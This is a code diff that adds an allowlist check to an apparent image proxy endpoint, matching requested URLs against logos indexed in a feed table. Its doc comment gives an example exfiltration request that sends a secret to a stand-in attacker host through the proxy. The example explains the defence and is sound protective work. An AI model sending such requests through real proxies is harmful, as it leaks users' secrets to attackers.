@@ -338,3 +338,39 @@ export async function readFeed(
     unpriced: [...unpriced].sort(),
   };
 }
+
+
+/**
+ * Is this a logo URL the app has actually indexed?
+ *
+ * Guards the image proxy. Without it /api/img fetches any URL it is given,
+ * which makes it a same-origin exfiltration channel no CSP can close: a script
+ * on the page calls /api/img?u=https://attacker/?k=<secret> and the server
+ * makes that request for it.
+ *
+ * Answered from the feed's own table, so it needs no separate allowlist to
+ * maintain and cannot drift out of step with what the feed is showing. Cached
+ * briefly because the feed repaints constantly and this is on the path of
+ * every image.
+ */
+const logoCache = { at: 0, set: new Set<string>() };
+const LOGO_TTL_MS = 30_000;
+
+export function isKnownLogo(url: string): boolean {
+  const u = url.trim();
+  if (!u) return false;
+  if (Date.now() - logoCache.at > LOGO_TTL_MS) {
+    try {
+      const rows = db()
+        .prepare(`SELECT DISTINCT logo FROM feed_tokens WHERE logo IS NOT NULL AND logo <> ''`)
+        .all() as { logo: string }[];
+      logoCache.set = new Set(rows.map((r) => r.logo.trim()));
+      logoCache.at = Date.now();
+    } catch {
+      // With no database there is nothing to serve and nothing to protect;
+      // refusing is the safe direction.
+      return false;
+    }
+  }
+  return logoCache.set.has(u);
+}
